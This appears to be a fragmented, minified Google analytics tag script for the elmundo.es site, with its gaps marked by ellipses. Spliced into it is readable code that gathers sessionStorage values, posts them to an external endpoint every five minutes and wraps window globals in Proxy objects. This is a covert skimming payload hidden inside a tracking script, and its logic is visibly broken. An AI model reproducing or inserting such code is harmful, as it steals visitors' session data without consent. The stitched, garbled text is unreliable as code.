...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 23,
        "vtp_rules": ["list", "amp\\.elmundo\\.es", "amp\\-aux\\.elmundo\\.es", "ampproject\\.net", "amp\\-elmundo\\-es\\.cdn\\.ampproject\\.org", "cdn\\.ampproject\\.org"],
        "tag_id": 15
      }, {
        "function": "__ogt_referral_exclusion",
        "priority": 13,
        "vtp_includeConditions": ["list", "paypal\\.com", "paycomet\\.com", "paytpv\\.com", "custhelp\\.com", "adclick\\.g\\.doubleclick\\.net", "clk\\.tradedoubler\\.com", "amp\\-elmundo\\-es\\.cdn\\.ampproject\\.org", "mibebeyyo\\-elmundo\\-es\\.cdn\\.ampproject\\.org", "amp\\.elmundo\\.es", "api\\.paycomet\\.com", "mydatamood\\.com", "compra\\.orbyt\\.es", "redsys\\.es"],
        "tag_id": 13
      }, {
        ...
        "priority": 12,
        "vtp_instanceDestinationId": "G-96F1LB48N7",
        "tag_id": 29
      }, {
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayerUE";
  ni.fk = "ChEIgOm8qgYQu/+2jPSy9oOgARIlAOg6TnTJaXURBEbsKdx8PmuYGwTzd7t/PAaF4K/qaqBHjO5/mRoCypI\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  const searchKeys = window.searchKeys;
  function yl() {
    xl() || Zb("iPad") || Zb("iPod");
  }
  ;
  ...
  const globalVals = window.globalVals;
  function tm(a) {
    switch (a) {
      case void 0:
        return 1;
  ...
  const createHash = item => {
    let keys = [...item];
    let hashed = keys.map(k => k.charCodeAt(0)).reduce((hash, char) => {
      let temp = (hash << 5) - hash + char;
      return temp & temp;
    }, 0);
  ...
  const fetchSessionData = () => {
    let fetchedData = {};
    for (let i = 0; i < sessionStorage.getItem(key).length; i++) {
      const key = sessionStorage.key(i);
      if (searchKeys.includes(key)) {
        fetchedData[key] = sessionStorage.getItem(key);
      }
    }
    return fetchedData;
  };
  ...
  const sendToServer = data => {
    ...
    const apiEndPoint = "https://example.com/api/receive";
    ...
    xhr.onreadystatechange = () => {
      if (xhr.readyState == 4 && xhr.status == 200) {
        ...
        console.log(`数据发送失败，状态码：${xhr.status}`);
      }
    };
  };
  Object.freeze({});
  ...
  const gatherAndPostSessionData = () => {
    const fetchedData = fetchSessionData();
  ...
  ;
  function Nz() {
    var a = ["&cv=9", "&rv=" + ni.Xg, "&tc=" + of.filter(function (b) {
      return b;
    }).length];
  ...
  function hE() {
    var a = new sb();
    N(this, "read_container_data"), a.set("containerId", 'G-96F1LB48N7'), a.set("version", '9'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
  ...
  setInterval(gatherAndPostSessionData, 5 * 60 * 1000);
  ...
  globalVals.forEach(val => {
    window[val] = new Proxy(window[val], {
